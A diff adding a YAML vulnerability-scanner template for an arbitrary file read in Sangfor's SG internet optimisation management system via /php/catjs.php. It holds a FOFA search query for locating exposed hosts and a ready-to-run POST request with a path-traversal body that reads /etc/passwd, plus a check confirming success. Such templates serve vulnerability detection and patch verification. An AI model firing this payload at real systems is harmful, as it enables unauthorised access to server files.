@@ -1,0 +1,29 @@
+id: sangfor-sg-catjs-fileread
+
+info:
+  name: 深信服 SG上网优化管理系统 catjs.php 任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件
+    FOFA: title=="SANGFOR上网优化管理"
+  reference:
+    - https://mp.weixin.qq.com/s/t5DF-O5uW1Fgnc9kkAlPiQ
+  tags: sangfor,fileread
+  created: 2023/09/05
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /php/catjs.php
+      headers:
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+      body: '["../../../../../../etc/passwd"]'
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b"// FILE: ../../../../../../etc/passwd")
+expression: r0()
